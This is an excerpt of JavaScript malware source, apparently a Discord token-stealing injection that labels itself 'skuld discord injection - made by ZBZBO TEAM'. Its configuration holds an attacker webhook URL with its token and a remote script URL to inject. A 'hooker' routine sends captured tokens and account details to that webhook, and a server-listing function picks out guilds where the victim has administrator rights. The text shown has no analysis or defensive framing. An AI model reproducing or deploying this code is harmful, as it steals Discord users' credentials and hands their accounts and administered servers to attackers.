...
const CONFIG = {
    webhook: "https://discord.com/api/webhooks/1253337218500788344/BNmndOOYXoFB5EMVZI8bBSDW211U3HX-4T5zDbOswJ9vIhwAQzORAMnKm53B7iyfVBBa",
    injection_url: "https://raw.githubusercontent.com/stuck1337/cc/main/vo.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
...
const hooker = async (content, token, account) => {
    ...
    content["username"] = "skuld - ZBZBO TEAM";
    content["avatar_url"] = "https://cdn.discordapp.com/attachments/1246096422663749774/1248763773624389662/df25f14e72b5ad20da6e275149dbe47e.jpg?ex=6664d964&is=666387e4&hm=2482825205e0ebca6067d66b4ef0eab1a6ba78cf8c3adad1427329ea121b7ecb&";
    ...
    content["embeds"][0]["footer"] = {
        "text": "skuld discord injection - made by ZBZBO TEAM",
...
const getServers = async token => {
    ...
    const filteredGuilds = guilds.filter((guild) => guild.permissions == '2251799813685247');
    let rareGuilds = "";
